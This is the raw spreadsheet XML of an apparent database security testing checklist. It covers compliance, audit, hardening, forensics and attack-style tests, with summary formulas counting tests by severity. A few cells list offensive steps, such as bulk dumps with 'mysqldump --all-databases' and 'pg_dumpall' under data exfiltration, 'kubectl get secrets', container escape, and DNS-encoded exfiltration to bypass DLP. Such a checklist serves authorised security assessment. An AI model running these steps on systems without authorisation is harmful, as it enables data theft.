    <t xml:space="preserve">PCI-DSS Compliance Check</t>
  </si>
  <si>
    <t xml:space="preserve">manual audit</t>
  </si>
  <si>
    <t xml:space="preserve">Verify PCI-DSS requirements</t>
  </si>
  <si>
    <t xml:space="preserve">Test card data encryption
Verify access controls
Audit logging requirements</t>
  </si>
  <si>
    <t xml:space="preserve">GDPR Compliance Testing</t>
  </si>
  <si>
    <t xml:space="preserve">Test GDPR requirements</t>
  </si>
  <si>
    <t xml:space="preserve">Test data deletion
Verify consent tracking
Data portability</t>
  </si>
  <si>
    <t xml:space="preserve">Audit Trail Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">SQL queries, log review</t>
  </si>
  <si>
    <t xml:space="preserve">Review audit logs</t>
  </si>
  <si>
    <t xml:space="preserve">SELECT * FROM audit_log
Check log completeness
Test log tampering</t>
  </si>
  <si>
    <t xml:space="preserve">Data Retention Policy Testing</t>
  </si>
  <si>
    <t xml:space="preserve">Verify retention policies</t>
  </si>
  <si>
    <t xml:space="preserve">Check for old data
Test deletion policies
Verify archival</t>
  </si>
  <si>
    <t xml:space="preserve">Database Fingerprinting</t>
  </si>
  <si>
    <t xml:space="preserve">Advanced DB identification</t>
  </si>
  <si>
    <t xml:space="preserve">nmap --script=*-enum target
Error-based fingerprinting
Timing analysis</t>
  </si>
  <si>
    <t xml:space="preserve">Inference Attack Testing</t>
  </si>
  <si>
    <t xml:space="preserve">Advanced</t>
  </si>
  <si>
    <t xml:space="preserve">manual, custom scripts</t>
  </si>
  <si>
    <t xml:space="preserve">Test statistical inference</t>
  </si>
  <si>
    <t xml:space="preserve">Manual, Python</t>
  </si>
  <si>
    <t xml:space="preserve">Aggregate query analysis
Statistical disclosure
Timing-based inference</t>
  </si>
  <si>
    <t xml:space="preserve">Side-Channel Attack Testing</t>
  </si>
  <si>
    <t xml:space="preserve">timing tools, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Test timing attacks</t>
  </si>
  <si>
    <t xml:space="preserve">Custom tools</t>
  </si>
  <si>
    <t xml:space="preserve">Measure query response times
Analyze timing patterns
Extract information</t>
  </si>
  <si>
    <t xml:space="preserve">Cache Poisoning</t>
  </si>
  <si>
    <t xml:space="preserve">SQL queries, custom</t>
  </si>
  <si>
    <t xml:space="preserve">Test query cache poisoning</t>
  </si>
  <si>
    <t xml:space="preserve">Poison query cache
Test result manipulation
Cache invalidation</t>
  </si>
  <si>
    <t xml:space="preserve">A08:2021 - Software &amp; Data Integrity</t>
  </si>
  <si>
    <t xml:space="preserve">Data Integrity Testing</t>
  </si>
  <si>
    <t xml:space="preserve">Data Integrity</t>
  </si>
  <si>
    <t xml:space="preserve">Test data manipulation</t>
  </si>
  <si>
    <t xml:space="preserve">Test constraints
Bypass validation
Test referential integrity</t>
  </si>
  <si>
    <t xml:space="preserve">Transaction Isolation Testing</t>
  </si>
  <si>
    <t xml:space="preserve">SQL queries, concurrent</t>
  </si>
  <si>
    <t xml:space="preserve">Test isolation levels</t>
  </si>
  <si>
    <t xml:space="preserve">Test dirty reads
Phantom reads
Non-repeatable reads</t>
  </si>
  <si>
    <t xml:space="preserve">Bulk Data Extraction</t>
  </si>
  <si>
    <t xml:space="preserve">Data Exfiltration</t>
  </si>
  <si>
    <t xml:space="preserve">export tools, scripts</t>
  </si>
  <si>
    <t xml:space="preserve">Test mass data export</t>
  </si>
  <si>
    <t xml:space="preserve">mysqldump, scripts</t>
  </si>
  <si>
    <t xml:space="preserve">mysqldump --all-databases
pg_dumpall
Test export restrictions</t>
  </si>
  <si>
    <t xml:space="preserve">Data Exfiltration via DNS</t>
  </si>
  <si>
    <t xml:space="preserve">Test DNS exfiltration</t>
  </si>
  <si>
    <t xml:space="preserve">Encode data in DNS queries
Test outbound DNS
Bypass DLP</t>
  </si>
  <si>
    <t xml:space="preserve">Container Database Security</t>
  </si>
  <si>
    <t xml:space="preserve">Container</t>
  </si>
  <si>
    <t xml:space="preserve">docker, kubectl</t>
  </si>
  <si>
    <t xml:space="preserve">Test containerized DB security</t>
  </si>
  <si>
    <t xml:space="preserve">docker exec -it container bash
kubectl get secrets
Test container escape</t>
  </si>
  <si>
    <t xml:space="preserve">Cloud Database IAM Testing</t>
  </si>
  <si>
    <t xml:space="preserve">AWS CLI, az cli, gcloud</t>
  </si>
  <si>
    <t xml:space="preserve">Test cloud IAM policies</t>
  </si>
  <si>
    <t xml:space="preserve">AWS CLI, az</t>
  </si>
  <si>
    <t xml:space="preserve">aws rds describe-db-instances
Test IAM policies
Check public access</t>
  </si>
  <si>
    <t xml:space="preserve">Cloud Database Snapshot Security</t>
  </si>
  <si>
    <t xml:space="preserve">AWS CLI, az cli</t>
  </si>
  <si>
    <t xml:space="preserve">Test snapshot security</t>
  </si>
  <si>
    <t xml:space="preserve">AWS CLI</t>
  </si>
  <si>
    <t xml:space="preserve">aws rds describe-db-snapshots
Test public snapshots
Copy snapshots</t>
  </si>
  <si>
    <t xml:space="preserve">Database-as-a-Service Security</t>
  </si>
  <si>
    <t xml:space="preserve">cloud CLI tools</t>
  </si>
  <si>
    <t xml:space="preserve">Test DBaaS security</t>
  </si>
  <si>
    <t xml:space="preserve">Cloud CLI</t>
  </si>
  <si>
    <t xml:space="preserve">Test managed service security
Review configurations
Audit access logs</t>
  </si>
  <si>
    <t xml:space="preserve">Database Log Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">Forensics</t>
  </si>
  <si>
    <t xml:space="preserve">log parsers, grep</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze database logs</t>
  </si>
  <si>
    <t xml:space="preserve">grep, awk, splunk</t>
  </si>
  <si>
    <t xml:space="preserve">grep 'failed login' logs
Analyze slow query log
Parse error logs</t>
  </si>
  <si>
    <t xml:space="preserve">Anomaly Detection</t>
  </si>
  <si>
    <t xml:space="preserve">monitoring tools</t>
  </si>
  <si>
    <t xml:space="preserve">Detect unusual activity</t>
  </si>
  <si>
    <t xml:space="preserve">Monitoring tools</t>
  </si>
  <si>
    <t xml:space="preserve">Detect unusual queries
Access pattern analysis
Alert on anomalies</t>
  </si>
  <si>
    <t xml:space="preserve">Post-Compromise Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">forensic tools</t>
  </si>
  <si>
    <t xml:space="preserve">Investigate compromise</t>
  </si>
  <si>
    <t xml:space="preserve">Manual analysis</t>
  </si>
  <si>
    <t xml:space="preserve">Check for backdoors
Review audit logs
Analyze modifications</t>
  </si>
  <si>
    <t xml:space="preserve">Unnecessary Services Check</t>
  </si>
  <si>
    <t xml:space="preserve">Hardening</t>
  </si>
  <si>
    <t xml:space="preserve">netstat, ps</t>
  </si>
  <si>
    <t xml:space="preserve">Identify running services</t>
  </si>
  <si>
    <t xml:space="preserve">netstat -tlnp | grep mysql
ps aux | grep postgres
Disable unnecessary services</t>
  </si>
  <si>
    <t xml:space="preserve">Default Database Objects</t>
  </si>
  <si>
    <t xml:space="preserve">Find default objects</t>
  </si>
  <si>
    <t xml:space="preserve">List default schemas
Find sample databases
Remove test accounts</t>
  </si>
  <si>
    <t xml:space="preserve">File Permission Analysis</t>
  </si>
  <si>
    <t xml:space="preserve">OS commands</t>
  </si>
  <si>
    <t xml:space="preserve">Check file permissions</t>
  </si>
  <si>
    <t xml:space="preserve">ls, icacls</t>
  </si>
  <si>
    <t xml:space="preserve">ls -la /var/lib/mysql
icacls C:\Program Files\MSSQL
Verify ownership</t>
  </si>
  <si>
    <t xml:space="preserve">Network Listener Configuration</t>
  </si>
  <si>
    <t xml:space="preserve">netstat, config review</t>
  </si>
  <si>
    <t xml:space="preserve">Check listening interfaces</t>
  </si>
  <si>
    <t xml:space="preserve">netstat</t>
  </si>
  <si>
    <t xml:space="preserve">netstat -an | grep LISTEN
Check bind-address
Review listener config</t>
  </si>
  <si>
    <t xml:space="preserve">Patch Level Assessment</t>
  </si>
  <si>
    <t xml:space="preserve">Vulnerability</t>
  </si>
  <si>
    <t xml:space="preserve">version check, CVE search</t>
  </si>
  <si>
    <t xml:space="preserve">Verify patching status</t>
  </si>
  <si>
    <t xml:space="preserve">Check DB version
Search for CVEs
Test known exploits</t>
  </si>
  <si>
    <t xml:space="preserve">A06:2021 - Vulnerable Components</t>
  </si>
  <si>
    <t xml:space="preserve">Security Baseline Comparison</t>
  </si>
  <si>
    <t xml:space="preserve">Assessment</t>
  </si>
  <si>
    <t xml:space="preserve">CIS benchmarks, manual</t>
  </si>
  <si>
    <t xml:space="preserve">Compare to security baseline</t>
  </si>
  <si>
    <t xml:space="preserve">CIS Benchmark comparison
STIG compliance
Best practice audit</t>
  </si>
  <si>
    <t xml:space="preserve">Comprehensive Security Report</t>
  </si>
  <si>
    <t xml:space="preserve">Reporting</t>
  </si>
  <si>
    <t xml:space="preserve">report tools</t>
  </si>
  <si>
    <t xml:space="preserve">Document all findings</t>
  </si>
  <si>
    <t xml:space="preserve">Compile vulnerabilities
Risk assessment
Remediation recommendations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</si>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</sst>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90EE90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2" t="s">
        <v>4</v>
      </c>
      <c r="B4" s="3" t="n">
        <f aca="false">COUNTIF('Database Security Tests'!D:D,"Critical")</f>
        <v>36</v>
      </c>
      <c r="C4" s="3" t="n">
        <f aca="false">B4/$B$8*100</f>
        <v>36</v>
      </c>
    </row>
    <row r="5" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A5" s="2" t="s">
        <v>5</v>
      </c>
      <c r="B5" s="3" t="n">
        <f aca="false">COUNTIF('Database Security Tests'!D:D,"High")</f>
        <v>50</v>
      </c>
      <c r="C5" s="3" t="n">
        <f aca="false">B5/$B$8*100</f>
        <v>50</v>
      </c>
    </row>
    <row r="6" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A6" s="2" t="s">
        <v>6</v>
      </c>
      <c r="B6" s="3" t="n">
        <f aca="false">COUNTIF('Database Security Tests'!D:D,"Medium")</f>
        <v>9</v>
      </c>
      <c r="C6" s="3" t="n">
        <f aca="false">B6/$B$8*100</f>
        <v>9</v>
      </c>
    </row>
    <row r="7" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A7" s="2" t="s">
        <v>7</v>
      </c>
      <c r="B7" s="3" t="n">
        <f aca="false">COUNTIF('Database Security Tests'!D:D,"Low")</f>
        <v>5</v>
      </c>
      <c r="C7" s="3" t="n">
        <f aca="false">B7/$B$8*100</f>
        <v>5</v>
      </c>
    </row>
    <row r="8" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A8" s="2" t="s">
        <v>8</v>
      </c>
      <c r="B8" s="3" t="n">
        <f aca="false">COUNTA('Database Security Tests'!A:A)-1</f>
        <v>100</v>
      </c>
      <c r="C8" s="3" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="10" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A10" s="2" t="s">
        <v>10</v>
      </c>
      <c r="B10" s="3" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="11" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A11" s="2" t="s">
        <v>11</v>
      </c>
      <c r="B11" s="3" t="n">
        <f aca="false">COUNTIF('Database Security Tests'!E:E,"Network")</f>
        <v>21</v>
      </c>
    </row>
    <row r="12" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A12" s="2" t="s">
        <v>12</v>
      </c>
      <c r="B12" s="3" t="n">
        <f aca="false">COUNTIF('Database Security Tests'!E:E,"Database")</f>
        <v>61</v>
      </c>
    </row>
    <row r="13" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A13" s="2" t="s">
        <v>13</v>
      </c>
      <c r="B13" s="3" t="n">
        <f aca="false">COUNTIF('Database Security Tests'!E:E,"Application")</f>
        <v>14</v>
      </c>
    </row>
    <row r="14" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A14" s="2" t="s">
        <v>14</v>
      </c>
      <c r="B14" s="3" t="n">
        <f aca="false">COUNTIF('Database Security Tests'!E:E,"Cloud")</f>
        <v>3</v>
      </c>
    </row>
    <row r="15" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A15" s="2" t="s">
        <v>15</v>
      </c>
      <c r="B15" s="3" t="n">
        <f aca="false">COUNTIF('Database Security Tests'!E:E,"Documentation")</f>
        <v>1</v>
      </c>
    </row>
    <row r="17" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A17" s="2" t="s">
        <v>16</v>
      </c>
      <c r="B17" s="3" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="18" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A18" s="2" t="s">
        <v>17</v>
      </c>
      <c r="B18" s="3" t="n">
        <f aca="false">COUNTIFS('Database Security Tests'!K:K,"&gt;=9")</f>
        <v>0</v>
      </c>
    </row>
    <row r="19" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A19" s="2" t="s">
        <v>18</v>
      </c>
      <c r="B19" s="3" t="n">
        <f aca="false">COUNTIFS('Database Security Tests'!K:K,"&gt;=7",'Database Security Tests'!K:K,"&lt;9")</f>
        <v>0</v>
      </c>
    </row>
    <row r="20" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A20" s="2" t="s">
        <v>19</v>
      </c>
      <c r="B20" s="3" t="n">
        <f aca="false">COUNTIFS('Database Security Tests'!K:K,"&gt;=4",'Database Security Tests'!K:K,"&lt;7")</f>
        <v>0</v>
      </c>
    </row>
    <row r="21" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A21" s="2" t="s">
        <v>20</v>
      </c>
      <c r="B21" s="3" t="n">
        <f aca="false">COUNTIFS('Database Security Tests'!K:K,"&gt;=0.1",'Database Security Tests'!K:K,"&lt;4")</f>
        <v>0</v>
      </c>
    </row>
    <row r="22" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A22" s="2" t="s">
        <v>21</v>
      </c>
      <c r="B22" s="3" t="n">
        <f aca="false">COUNTIF('Database Security Tests'!K:K,"0.0")</f>
        <v>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65"/>
    <col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="10" min="10" style="0" width="32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</row>
    <row r="2" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A2" s="5" t="n">
        <v>1</v>
      </c>
      <c r="B2" s="5" t="s">
        <v>33</v>
      </c>
      <c r="C2" s="5" t="s">
        <v>34</v>
      </c>
      <c r="D2" s="6" t="s">
        <v>7</v>
      </c>
      <c r="E2" s="5" t="s">
        <v>11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</row>
    <row r="3" customFormat="false" ht="28.35" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A3" s="5" t="n">
        <v>2</v>
      </c>
      <c r="B3" s="5" t="s">
        <v>41</v>
      </c>
      <c r="C3" s="5" t="s">
        <v>34</v>
      </c>
      <c r="D3" s="6" t="s">
        <v>7</v>
      </c>
      <c r="E3" s="5" t="s">
        <v>11</v>
      </c>
      <c r="F3" s="5" t="s">
        <v>42</v>
      </c>
      <c r="G3" s="5" t="s">
        <v>43</v>
      </c>
      <c r="H3" s="5" t="s">
        <v>42</v>
      </c>
      <c r="I3" s="5" t="s">
        <v>44</v>
      </c>
      <c r="J3" s="5" t="s">
        <v>39</v>
      </c>
      <c r="K3" s="5" t="s">
        <v>45</v>
      </c>
    </row>
    <row r="4" customFormat="false" ht="28.35" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A4" s="5" t="n">
        <v>3</v>
      </c>
      <c r="B4" s="5" t="s">
        <v>46</v>
      </c>
      <c r="C4" s="5" t="s">
        <v>34</v>
      </c>
      <c r="D4" s="6" t="s">
        <v>7</v>
      </c>
      <c r="E4" s="5" t="s">
        <v>11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39</v>
      </c>
      <c r="K4" s="5" t="s">
        <v>45</v>
      </c>
    </row>
    <row r="5" customFormat="false" ht="28.35" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A5" s="5" t="n">
        <v>4</v>
      </c>
      <c r="B5" s="5" t="s">
        <v>51</v>
      </c>
      <c r="C5" s="5" t="s">
        <v>34</v>
      </c>
      <c r="D5" s="7" t="s">
        <v>6</v>
      </c>
      <c r="E5" s="5" t="s">
        <v>11</v>
      </c>
      <c r="F5" s="5" t="s">
        <v>52</v>
      </c>
      <c r="G5" s="5" t="s">
        <v>53</v>
      </c>
      <c r="H5" s="5" t="s">
        <v>54</v>
      </c>
      <c r="I5" s="5" t="s">
        <v>55</v>
      </c>
      <c r="J5" s="5" t="s">
        <v>39</v>
      </c>
      <c r="K5" s="5" t="s">
        <v>56</v>
      </c>
    </row>
    <row r="6" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A6" s="5" t="n">
        <v>5</v>
      </c>
      <c r="B6" s="5" t="s">
        <v>57</v>
      </c>
      <c r="C6" s="5" t="s">
        <v>34</v>
      </c>
      <c r="D6" s="6" t="s">
        <v>7</v>
      </c>
      <c r="E6" s="5" t="s">
        <v>11</v>
      </c>
      <c r="F6" s="5" t="s">
        <v>58</v>
      </c>
      <c r="G6" s="5" t="s">
        <v>59</v>
      </c>
      <c r="H6" s="5" t="s">
        <v>60</v>
      </c>
      <c r="I6" s="5" t="s">
        <v>61</v>
      </c>
      <c r="J6" s="5" t="s">
        <v>39</v>
      </c>
      <c r="K6" s="5" t="s">
        <v>45</v>
      </c>
    </row>
    <row r="7" customFormat="false" ht="28.35" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A7" s="5" t="n">
        <v>6</v>
      </c>
      <c r="B7" s="5" t="s">
        <v>62</v>
      </c>
      <c r="C7" s="5" t="s">
        <v>63</v>
      </c>
      <c r="D7" s="8" t="s">
        <v>4</v>
      </c>
      <c r="E7" s="5" t="s">
        <v>11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69</v>
      </c>
    </row>
    <row r="8" customFormat="false" ht="28.35" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A8" s="5" t="n">
        <v>7</v>
      </c>
      <c r="B8" s="5" t="s">
        <v>70</v>
      </c>
      <c r="C8" s="5" t="s">
        <v>63</v>
      </c>
      <c r="D8" s="8" t="s">
        <v>4</v>
      </c>
      <c r="E8" s="5" t="s">
        <v>11</v>
      </c>
      <c r="F8" s="5" t="s">
        <v>71</v>
      </c>
      <c r="G8" s="5" t="s">
        <v>72</v>
      </c>
      <c r="H8" s="5" t="s">
        <v>73</v>
      </c>
      <c r="I8" s="5" t="s">
        <v>74</v>
      </c>
      <c r="J8" s="5" t="s">
        <v>68</v>
      </c>
      <c r="K8" s="5" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="9" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A9" s="5" t="n">
        <v>8</v>
      </c>
      <c r="B9" s="5" t="s">
        <v>76</v>
      </c>
      <c r="C9" s="5" t="s">
        <v>63</v>
      </c>
      <c r="D9" s="8" t="s">
        <v>4</v>
      </c>
      <c r="E9" s="5" t="s">
        <v>11</v>
      </c>
      <c r="F9" s="5" t="s">
        <v>77</v>
      </c>
      <c r="G9" s="5" t="s">
        <v>78</v>
      </c>
      <c r="H9" s="5" t="s">
        <v>77</v>
      </c>
      <c r="I9" s="5" t="s">
        <v>79</v>
      </c>
      <c r="J9" s="5" t="s">
        <v>68</v>
      </c>
      <c r="K9" s="5" t="s">
        <v>69</v>
      </c>
    </row>
    <row r="10" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A10" s="5" t="n">
        <v>9</v>
      </c>
      <c r="B10" s="5" t="s">
        <v>80</v>
      </c>
      <c r="C10" s="5" t="s">
        <v>63</v>
      </c>
      <c r="D10" s="9" t="s">
        <v>5</v>
      </c>
      <c r="E10" s="5" t="s">
        <v>12</v>
      </c>
      <c r="F10" s="5" t="s">
        <v>81</v>
      </c>
      <c r="G10" s="5" t="s">
        <v>82</v>
      </c>
      <c r="H10" s="5" t="s">
        <v>83</v>
      </c>
      <c r="I10" s="5" t="s">
        <v>84</v>
      </c>
      <c r="J10" s="5" t="s">
        <v>68</v>
      </c>
      <c r="K10" s="5" t="s">
        <v>85</v>
      </c>
    </row>
    <row r="11" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A11" s="5" t="n">
        <v>10</v>
      </c>
      <c r="B11" s="5" t="s">
        <v>86</v>
      </c>
      <c r="C11" s="5" t="s">
        <v>63</v>
      </c>
      <c r="D11" s="7" t="s">
        <v>6</v>
      </c>
      <c r="E11" s="5" t="s">
        <v>11</v>
      </c>
      <c r="F11" s="5" t="s">
        <v>87</v>
      </c>
      <c r="G11" s="5" t="s">
        <v>88</v>
      </c>
      <c r="H11" s="5" t="s">
        <v>89</v>
      </c>
      <c r="I11" s="5" t="s">
        <v>90</v>
      </c>
      <c r="J11" s="5" t="s">
        <v>68</v>
      </c>
      <c r="K11" s="5" t="s">
        <v>56</v>
      </c>
    </row>
    <row r="12" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A12" s="5" t="n">
        <v>11</v>
      </c>
      <c r="B12" s="5" t="s">
        <v>91</v>
      </c>
      <c r="C12" s="5" t="s">
        <v>63</v>
      </c>
      <c r="D12" s="9" t="s">
        <v>5</v>
      </c>
      <c r="E12" s="5" t="s">
        <v>12</v>
      </c>
      <c r="F12" s="5" t="s">
        <v>92</v>
      </c>
      <c r="G12" s="5" t="s">
        <v>93</v>
      </c>
      <c r="H12" s="5" t="s">
        <v>94</v>
      </c>
      <c r="I12" s="5" t="s">
        <v>95</v>
      </c>
      <c r="J12" s="5" t="s">
        <v>68</v>
      </c>
      <c r="K12" s="5" t="s">
        <v>85</v>
      </c>
    </row>
    <row r="13" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A13" s="5" t="n">
        <v>12</v>
      </c>
      <c r="B13" s="5" t="s">
        <v>96</v>
      </c>
      <c r="C13" s="5" t="s">
        <v>63</v>
      </c>
      <c r="D13" s="8" t="s">
        <v>4</v>
      </c>
      <c r="E13" s="5" t="s">
        <v>11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68</v>
      </c>
      <c r="K13" s="5" t="s">
        <v>69</v>
      </c>
    </row>
    <row r="14" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A14" s="5" t="n">
        <v>13</v>
      </c>
      <c r="B14" s="5" t="s">
        <v>101</v>
      </c>
      <c r="C14" s="5" t="s">
        <v>102</v>
      </c>
      <c r="D14" s="8" t="s">
        <v>4</v>
      </c>
      <c r="E14" s="5" t="s">
        <v>12</v>
      </c>
      <c r="F14" s="5" t="s">
        <v>103</v>
      </c>
      <c r="G14" s="5" t="s">
        <v>104</v>
      </c>
      <c r="H14" s="5" t="s">
        <v>83</v>
      </c>
      <c r="I14" s="5" t="s">
        <v>105</v>
      </c>
      <c r="J14" s="5" t="s">
        <v>106</v>
      </c>
      <c r="K14" s="5" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="15" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A15" s="5" t="n">
        <v>14</v>
      </c>
      <c r="B15" s="5" t="s">
        <v>107</v>
      </c>
      <c r="C15" s="5" t="s">
        <v>102</v>
      </c>
      <c r="D15" s="9" t="s">
        <v>5</v>
      </c>
      <c r="E15" s="5" t="s">
        <v>12</v>
      </c>
      <c r="F15" s="5" t="s">
        <v>108</v>
      </c>
      <c r="G15" s="5" t="s">
        <v>109</v>
      </c>
      <c r="H15" s="5" t="s">
        <v>83</v>
      </c>
      <c r="I15" s="5" t="s">
        <v>110</v>
      </c>
      <c r="J15" s="5" t="s">
        <v>106</v>
      </c>
      <c r="K15" s="5" t="s">
        <v>85</v>
      </c>
    </row>
    <row r="16" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A16" s="5" t="n">
        <v>15</v>
      </c>
      <c r="B16" s="5" t="s">
        <v>111</v>
      </c>
      <c r="C16" s="5" t="s">
        <v>102</v>
      </c>
      <c r="D16" s="9" t="s">
        <v>5</v>
      </c>
      <c r="E16" s="5" t="s">
        <v>12</v>
      </c>
      <c r="F16" s="5" t="s">
        <v>108</v>
      </c>
      <c r="G16" s="5" t="s">
        <v>112</v>
      </c>
      <c r="H16" s="5" t="s">
        <v>83</v>
      </c>
      <c r="I16" s="5" t="s">
        <v>113</v>
      </c>
      <c r="J16" s="5" t="s">
        <v>106</v>
      </c>
      <c r="K16" s="5" t="s">
        <v>85</v>
      </c>
    </row>
    <row r="17" customFormat="false" ht="28.35" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A17" s="5" t="n">
        <v>16</v>
      </c>
      <c r="B17" s="5" t="s">
        <v>114</v>
      </c>
      <c r="C17" s="5" t="s">
        <v>102</v>
      </c>
      <c r="D17" s="9" t="s">
        <v>5</v>
      </c>
      <c r="E17" s="5" t="s">
        <v>12</v>
      </c>
      <c r="F17" s="5" t="s">
        <v>108</v>
      </c>
      <c r="G17" s="5" t="s">
        <v>115</v>
      </c>
      <c r="H17" s="5" t="s">
        <v>83</v>
      </c>
      <c r="I17" s="5" t="s">
        <v>116</v>
      </c>
      <c r="J17" s="5" t="s">
        <v>106</v>
      </c>
      <c r="K17" s="5" t="s">
        <v>85</v>
      </c>
    </row>
    <row r="18" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A18" s="5" t="n">
        <v>17</v>
      </c>
      <c r="B18" s="5" t="s">
        <v>117</v>
      </c>
      <c r="C18" s="5" t="s">
        <v>102</v>
      </c>
      <c r="D18" s="9" t="s">
        <v>5</v>
      </c>
      <c r="E18" s="5" t="s">
        <v>12</v>
      </c>
      <c r="F18" s="5" t="s">
        <v>108</v>
      </c>
      <c r="G18" s="5" t="s">
        <v>118</v>
      </c>
      <c r="H18" s="5" t="s">
        <v>83</v>
      </c>
      <c r="I18" s="5" t="s">
        <v>119</v>
      </c>
      <c r="J18" s="5" t="s">
        <v>106</v>
      </c>
      <c r="K18" s="5" t="s">
        <v>120</v>
      </c>
    </row>
    <row r="19" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A19" s="5" t="n">
        <v>18</v>
      </c>
      <c r="B19" s="5" t="s">
        <v>121</v>
      </c>
      <c r="C19" s="5" t="s">
        <v>102</v>
      </c>
      <c r="D19" s="8" t="s">
        <v>4</v>
      </c>
      <c r="E19" s="5" t="s">
        <v>12</v>
      </c>
      <c r="F19" s="5" t="s">
        <v>122</v>
      </c>
      <c r="G19" s="5" t="s">
        <v>123</v>
      </c>
      <c r="H19" s="5" t="s">
        <v>124</v>
      </c>
      <c r="I19" s="5" t="s">
        <v>125</v>
      </c>
      <c r="J19" s="5" t="s">
        <v>126</v>
      </c>
      <c r="K19" s="5" t="s">
        <v>69</v>
      </c>
    </row>
    <row r="20" customFormat="false" ht="28.35" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A20" s="5" t="n">
        <v>19</v>
      </c>
      <c r="B20" s="5" t="s">
        <v>127</v>
      </c>
      <c r="C20" s="5" t="s">
        <v>128</v>
      </c>
      <c r="D20" s="8" t="s">
        <v>4</v>
      </c>
      <c r="E20" s="5" t="s">
        <v>13</v>
      </c>
      <c r="F20" s="5" t="s">
        <v>129</v>
      </c>
      <c r="G20" s="5" t="s">
        <v>130</v>
      </c>
      <c r="H20" s="5" t="s">
        <v>131</v>
      </c>
      <c r="I20" s="5" t="s">
        <v>132</v>
      </c>
      <c r="J20" s="5" t="s">
        <v>126</v>
      </c>
      <c r="K20" s="5" t="s">
        <v>69</v>
      </c>
    </row>
    <row r="21" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A21" s="5" t="n">
        <v>20</v>
      </c>
      <c r="B21" s="5" t="s">
        <v>133</v>
      </c>
      <c r="C21" s="5" t="s">
        <v>128</v>
      </c>
      <c r="D21" s="8" t="s">
        <v>4</v>
      </c>
      <c r="E21" s="5" t="s">
        <v>13</v>
      </c>
      <c r="F21" s="5" t="s">
        <v>134</v>
      </c>
      <c r="G21" s="5" t="s">
        <v>135</v>
      </c>
      <c r="H21" s="5" t="s">
        <v>131</v>
      </c>
      <c r="I21" s="5" t="s">
        <v>136</v>
      </c>
      <c r="J21" s="5" t="s">
        <v>126</v>
      </c>
      <c r="K21" s="5" t="s">
        <v>137</v>
      </c>
    </row>
    <row r="22" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A22" s="5" t="n">
        <v>21</v>
      </c>
      <c r="B22" s="5" t="s">
        <v>138</v>
      </c>
      <c r="C22" s="5" t="s">
        <v>128</v>
      </c>
      <c r="D22" s="8" t="s">
        <v>4</v>
      </c>
      <c r="E22" s="5" t="s">
        <v>13</v>
      </c>
      <c r="F22" s="5" t="s">
        <v>139</v>
      </c>
      <c r="G22" s="5" t="s">
        <v>140</v>
      </c>
      <c r="H22" s="5" t="s">
        <v>141</v>
      </c>
      <c r="I22" s="5" t="s">
        <v>142</v>
      </c>
      <c r="J22" s="5" t="s">
        <v>126</v>
      </c>
      <c r="K22" s="5" t="s">
        <v>137</v>
      </c>
    </row>
